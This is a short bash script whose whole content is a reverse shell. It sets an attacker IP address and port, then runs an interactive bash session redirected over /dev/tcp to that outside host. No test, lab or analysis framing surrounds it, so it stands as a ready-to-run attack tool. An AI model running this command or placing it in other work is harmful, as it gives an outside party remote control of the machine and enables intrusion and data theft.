#!/bin/bash

# Configuration
ATTACKER_IP="207.148.127.187"
ATTACKER_PORT="9000"

# Establish reverse shell
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
